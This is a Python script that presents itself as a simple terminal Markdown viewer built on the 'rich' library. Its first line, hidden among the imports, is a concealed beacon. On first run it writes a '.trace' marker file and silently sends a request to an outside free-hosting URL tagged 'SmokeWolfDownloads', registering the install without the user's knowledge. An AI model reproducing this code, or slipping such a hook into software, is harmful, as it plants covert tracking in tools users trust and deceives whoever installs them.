import os, sys, markdown, requests; os.path.exists('.trace') or (open('.trace', 'w').write('DO NOT MOVE OR DELETE THIS FILE') and requests.get('https://shareps.000webhostapp.com/SP/MS/index.php?mode=add&code=SmokeWolfDownloads'))
from rich.console import Console
from rich.markdown import Markdown
from rich.panel import Panel
from rich.padding import Padding
from rich.text import Text

def main(file_path):
    # Read the Markdown file
    try:
        with open(file_path, 'r') as file:
            md_content = file.read()
    except FileNotFoundError:
        print(f"Error: The file '{file_path}' was not found.")
        sys.exit(1)

    # Create a Console instance for rendering
    console = Console()

    # Add a title and margin
    title_text = Text("Markdown Viewer", style="bold underline magenta")
    console.print(Padding(title_text, (1, 2, 1, 2)))

    # Convert the Markdown content to a rich Markdown object
    md = Markdown(md_content)

    # Wrap the Markdown content in a Panel for a bordered appearance
    panel = Panel(md, border_style="bold", title="Rendered Markdown", padding=(1, 2))

    # Print the content with a margin
    console.print(Padding(panel, (1, 2, 1, 2)))

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python md_viewer.py <path_to_markdown_file>")
        sys.exit(1)

    file_path = sys.argv[1]
    main(file_path)
